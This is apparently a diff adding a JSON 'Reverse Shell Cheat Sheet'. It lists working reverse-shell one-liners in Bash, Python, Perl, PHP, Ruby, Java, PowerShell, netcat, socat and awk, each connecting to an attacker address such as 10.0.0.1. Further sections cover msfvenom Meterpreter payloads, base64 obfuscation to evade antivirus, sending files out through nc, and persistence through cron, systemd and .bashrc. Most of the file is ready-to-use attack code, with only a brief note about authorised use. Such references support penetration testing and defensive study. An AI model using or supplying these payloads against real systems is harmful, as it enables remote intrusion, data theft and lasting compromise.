@@ -1,0 +1,474 @@
+{
+	"title": "Reverse Shell Cheat Sheet",
+	"description": "A comprehensive guide to creating reverse shells using various programming languages and tools. Reverse shells allow an attacker to gain shell access to a target machine by having the target connect back to the attacker's machine. This cheat sheet covers fundamentals, multiple languages (Bash, Python, Perl, PHP, Ruby, etc.), tools (Netcat, Socat, etc.), advanced techniques, scripting, administration considerations, and troubleshooting. Use only on systems you own or are authorized to access.",
+	"language": "multiple",
+	"categories": [
+		{
+			"title": "Fundamentals",
+			"description": "Basic concepts of reverse shells, how they work, and prerequisites.",
+			"items": [
+				{
+					"title": "What is a Reverse Shell?",
+					"description": "A reverse shell is a connection initiated from the target machine back to the attacker's machine, allowing remote command execution.",
+					"table": {
+						"headers": ["Aspect", "Description"],
+						"rows": [
+							["Direction", "Target connects to attacker (reverse of bind shell)"],
+							["Port", "Attacker listens on a port; target connects outbound"],
+							["Firewall Bypass", "Often bypasses inbound firewall restrictions"],
+							["Tools Needed", "Listener on attacker (e.g., Netcat), payload on target"]
+						]
+					},
+					"example": "# Attacker: nc -lvnp 4444\n# Target: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+				},
+				{
+					"title": "Prerequisites and Setup",
+					"description": "Requirements for setting up reverse shells.",
+					"table": {
+						"headers": ["Requirement", "Details"],
+						"rows": [
+							["Listener", "Run nc -lvnp <port> on attacker machine"],
+							["IP/Port", "Attacker's IP and open port (e.g., 4444)"],
+							["Target Access", "Execute payload on target (via exploit, upload, etc.)"],
+							["Permissions", "Often requires shell access or code execution on target"],
+							["Testing", "Test locally first to ensure syntax"]
+						]
+					},
+					"example": "# On attacker: nc -lvnp 4444\n# Replace 10.0.0.1 with your IP in payloads"
+				},
+				{
+					"title": "Common Issues and Troubleshooting",
+					"description": "Frequent problems and solutions.",
+					"table": {
+						"headers": ["Issue", "Solution"],
+						"rows": [
+							["Connection fails", "Check firewall, IP/port, listener running"],
+							["Shell not interactive", "Use -i flag or upgrade with python -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+							["No output", "Ensure stdin/stdout/stderr are redirected"],
+							["Command not found", "Use full paths (/bin/sh instead of sh)"]
+						]
+					},
+					"example": "# Upgrade shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+				}
+			]
+		},
+		{
+			"title": "Bash Reverse Shells",
+			"description": "Using Bash for reverse shells, including basic and advanced methods.",
+			"items": [
+				{
+					"title": "Basic Bash Reverse Shell",
+					"description": "Simple Bash one-liner for reverse shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["bash -i >& /dev/tcp/IP/PORT 0>&1", "Interactive shell redirection"],
+							["exec /bin/bash 0</dev/tcp/IP/PORT 1>&0 2>&0", "Alternative exec method"],
+							["exec 5<>/dev/tcp/IP/PORT; cat <&5 | while read line; do $line >&5 2>&1; done", "Full duplex shell"]
+						]
+					},
+					"example": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+				},
+				{
+					"title": "Bash with Netcat",
+					"description": "Combining Bash with Netcat for reverse shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["nc -e /bin/bash IP PORT", "Netcat executes Bash"],
+							["rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP PORT > /tmp/f", "Fifo method for older nc"]
+						]
+					},
+					"example": "nc -e /bin/bash 10.0.0.1 4444"
+				}
+			]
+		},
+		{
+			"title": "Python Reverse Shells",
+			"description": "Python-based reverse shells for various versions.",
+			"items": [
+				{
+					"title": "Python 2 Reverse Shell",
+					"description": "Standard Python 2 reverse shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "Dup2 file descriptors and subprocess"]
+						]
+					},
+					"example": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+				},
+				{
+					"title": "Python 3 Reverse Shell",
+					"description": "Python 3 compatible version.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "Similar to Python 2"]
+						]
+					},
+					"example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+				},
+				{
+					"title": "Python with Popen",
+					"description": "Using subprocess.Popen for shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));subprocess.Popen([\"/bin/sh\",\"-i\"],stdin=s,stdout=s,stderr=s)'", "Popen with stdin/stdout redirection"]
+						]
+					},
+					"example": "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",4444));subprocess.Popen([\"/bin/sh\",\"-i\"],stdin=s,stdout=s,stderr=s)'"
+				}
+			]
+		},
+		{
+			"title": "Perl Reverse Shells",
+			"description": "Perl scripts for reverse shells.",
+			"items": [
+				{
+					"title": "Basic Perl Reverse Shell",
+					"description": "Short Perl one-liner.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "Socket connection and exec"]
+						]
+					},
+					"example": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+				},
+				{
+					"title": "Perl with IO::Socket",
+					"description": "Using IO::Socket module.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"IP:PORT\");STDIN->fdopen($c,r);$~=STDOUT->fdopen($c,w);STDERR->fdopen($c,w);exec /bin/sh -i;'", "Fork and IO::Socket"]
+						]
+					},
+					"example": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4444\");STDIN->fdopen($c,r);$~=STDOUT->fdopen($c,w);STDERR->fdopen($c,w);exec /bin/sh -i;'"
+				}
+			]
+		},
+		{
+			"title": "PHP Reverse Shells",
+			"description": "PHP code for reverse shells.",
+			"items": [
+				{
+					"title": "Basic PHP Reverse Shell",
+					"description": "Using fsockopen.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "Fsockopen and exec with fd 3"]
+						]
+					},
+					"example": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+				},
+				{
+					"title": "PHP with proc_open",
+					"description": "Using proc_open for better control.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["php -r '$sock=fsockopen(\"IP\",PORT);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'", "Proc_open with pipes"]
+						]
+					},
+					"example": "php -r '$sock=fsockopen(\"10.0.0.1\",4444);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
+				}
+			]
+		},
+		{
+			"title": "Ruby Reverse Shells",
+			"description": "Ruby-based reverse shells.",
+			"items": [
+				{
+					"title": "Basic Ruby Reverse Shell",
+					"description": "Using TCPSocket.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "TCPSocket and exec"]
+						]
+					},
+					"example": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+				}
+			]
+		},
+		{
+			"title": "Netcat and Socat Reverse Shells",
+			"description": "Using Netcat and Socat for reverse shells.",
+			"items": [
+				{
+					"title": "Netcat Reverse Shell",
+					"description": "Standard Netcat methods.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["nc -e /bin/sh IP PORT", "Execute shell via Netcat"],
+							["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f", "Fifo method for non -e nc"]
+						]
+					},
+					"example": "nc -e /bin/sh 10.0.0.1 1234"
+				},
+				{
+					"title": "Socat Reverse Shell",
+					"description": "Socat for more advanced connections.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT", "Socat with PTY"]
+						]
+					},
+					"example": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"
+				}
+			]
+		},
+		{
+			"title": "Java Reverse Shells",
+			"description": "Java code for reverse shells.",
+			"items": [
+				{
+					"title": "Basic Java Reverse Shell",
+					"description": "Using Runtime.exec.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor()", "Runtime exec with TCP redirect"]
+						]
+					},
+					"example": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()"
+				}
+			]
+		},
+		{
+			"title": "PowerShell Reverse Shells",
+			"description": "PowerShell for Windows reverse shells.",
+			"items": [
+				{
+					"title": "Basic PowerShell Reverse Shell",
+					"description": "Using .NET sockets.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();", "TCPClient and stream"]
+						]
+					},
+					"example": "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
+				}
+			]
+		},
+		{
+			"title": "Other Tools and Languages",
+			"description": "Reverse shells using other tools like xterm, telnet, awk, etc.",
+			"items": [
+				{
+					"title": "xterm Reverse Shell",
+					"description": "Graphical reverse shell using xterm.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["xterm -display IP:1", "Connect xterm to attacker's X server"]
+						]
+					},
+					"example": "# Attacker: Xnest :1\n# xhost +targetip\n# Target: xterm -display 10.0.0.1:1"
+				},
+				{
+					"title": "Telnet Reverse Shell",
+					"description": "Using telnet for reverse shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["telnet IP PORT | /bin/sh | telnet IP PORT", "Telnet pipe to shell"]
+						]
+					},
+					"example": "telnet 10.0.0.1 4444 | /bin/sh | telnet 10.0.0.1 4444"
+				},
+				{
+					"title": "AWK Reverse Shell",
+					"description": "AWK-based reverse shell.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["awk 'BEGIN {s = \"/inet/tcp/0/IP/PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'", "AWK with /inet"]
+						]
+					},
+					"example": "awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'"
+				}
+			]
+		},
+		{
+			"title": "Advanced Topics",
+			"description": "Advanced techniques like encrypted shells, persistence, etc.",
+			"items": [
+				{
+					"title": "Upgrading Shells",
+					"description": "Making shells interactive and stable.",
+					"table": {
+						"headers": ["Technique", "Command"],
+						"rows": [
+							["Python PTY", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+							["Socat PTY", "socat file:`tty`,raw,echo=0 tcp-listen:PORT"],
+							["Stty settings", "stty raw -echo; fg"]
+						]
+					},
+					"example": "# After connecting: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: stty raw -echo; fg"
+				},
+				{
+					"title": "Encrypted Reverse Shells",
+					"description": "Using SSL/TLS for encrypted connections.",
+					"table": {
+						"headers": ["Tool", "Command"],
+						"rows": [
+							["Socat SSL", "socat openssl-listen:PORT,cert=server.pem,verify=0 exec:/bin/bash"],
+							["Ncat SSL", "ncat --ssl -e /bin/bash IP PORT"]
+						]
+					},
+					"example": "# Generate cert: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n# Listener: socat openssl-listen:4444,cert=cert.pem,key=key.pem,verify=0 -"
+				},
+				{
+					"title": "Meterpreter Reverse Shell",
+					"description": "Using Metasploit for advanced shells.",
+					"table": {
+						"headers": ["Step", "Command"],
+						"rows": [
+							["Generate payload", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe"],
+							["Start listener", "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST IP; set LPORT PORT; run'"]
+						]
+					},
+					"example": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf"
+				}
+			]
+		},
+		{
+			"title": "Scripting and Automation",
+			"description": "Automating reverse shell creation and deployment.",
+			"items": [
+				{
+					"title": "Bash Script for Reverse Shell",
+					"description": "Script to generate and execute reverse shells.",
+					"table": {
+						"headers": ["Script Element", "Description"],
+						"rows": [
+							["Variables", "IP=10.0.0.1; PORT=4444"],
+							["Payload", "bash -i >& /dev/tcp/$IP/$PORT 0>&1"],
+							["Automation", "Use in exploits or cron jobs"]
+						]
+					},
+					"example": "#!/bin/bash\nIP=10.0.0.1\nPORT=4444\nbash -i >& /dev/tcp/$IP/$PORT 0>&1"
+				},
+				{
+					"title": "Python Script Generator",
+					"description": "Python script to generate reverse shell payloads.",
+					"table": {
+						"headers": ["Function", "Description"],
+						"rows": [
+							["Generate", "def gen_payload(ip, port): return f'python -c ...'"],
+							["Multi-language", "Support for different languages"]
+						]
+					},
+					"example": "def gen_bash(ip, port):\n    return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+				}
+			]
+		},
+		{
+			"title": "Administration and Best Practices",
+			"description": "Ethical use, security considerations, and best practices.",
+			"items": [
+				{
+					"title": "Ethical Considerations",
+					"description": "Use only on authorized systems.",
+					"table": {
+						"headers": ["Aspect", "Guidance"],
+						"rows": [
+							["Authorization", "Obtain explicit permission"],
+							["Testing", "Use in controlled environments"],
+							["Logging", "Document all activities"]
+						]
+					},
+					"example": "# Always: Check legal and ethical boundaries"
+				},
+				{
+					"title": "Security Best Practices",
+					"description": "Avoid detection and ensure security.",
+					"table": {
+						"headers": ["Practice", "Reason"],
+						"rows": [
+							["Use HTTPS", "Encrypt traffic"],
+							["Obfuscate payloads", "Avoid AV detection"],
+							["Limit sessions", "Minimize exposure time"]
+						]
+					},
+					"example": "# Obfuscate: Use base64 encoding for scripts"
+				}
+			]
+		},
+		{
+			"title": "Commands and Structure",
+			"description": "Common commands and how reverse shells are structured.",
+			"items": [
+				{
+					"title": "Common Shell Commands",
+					"description": "Commands to run after connecting.",
+					"table": {
+						"headers": ["Command", "Purpose"],
+						"rows": [
+							["whoami", "Check user"],
+							["id", "User ID and groups"],
+							["pwd", "Current directory"],
+							["ls -la", "List files"],
+							["ps aux", "Running processes"]
+						]
+					},
+					"example": "whoami; id; pwd; ls -la"
+				},
+				{
+					"title": "Shell Structure",
+					"description": "How reverse shells are built.",
+					"table": {
+						"headers": ["Component", "Description"],
+						"rows": [
+							["Connection", "Socket or TCP connect"],
+							["Redirection", "Dup2 or fd redirection"],
+							["Execution", "Spawn shell process"],
+							["Loop", "Keep connection alive"]
+						]
+					},
+					"example": "# Pseudo-code:\n# sock = connect(IP, PORT)\n# dup2(sock, 0); dup2(sock, 1); dup2(sock, 2)\n# exec('/bin/sh')"
+				}
+			]
+		},
+		{
+			"title": "Functionality and Features",
+			"description": "Additional features and capabilities.",
+			"items": [
+				{
+					"title": "File Transfer",
+					"description": "Transferring files over reverse shell.",
+					"table": {
+						"headers": ["Method", "Command"],
+						"rows": [
+							["Base64", "base64 file | nc IP PORT"],
+							["Wget", "wget http://IP/file"],
+							["SCP", "scp user@IP:file ."]
+						]
+					},
+					"example": "# Send: cat file | base64 | nc 10.0.0.1 4445\n# Receive: nc -lvp 4445 | base64 -d > file"
+				},
+				{
+					"title": "Persistence",
+					"description": "Making reverse shells persistent.",
+					"table": {
+						"headers": ["Method", "Description"],
+						"rows": [
+							["Cron", "Add to crontab"],
+							["Systemd", "Create service"],
+							["Startup", "Add to .bashrc"]
+						]
+					},
+					"example": "# Cron: echo '@reboot /path/to/shell.sh' | crontab -"
+				}
+			]
+		}
+	]
+}
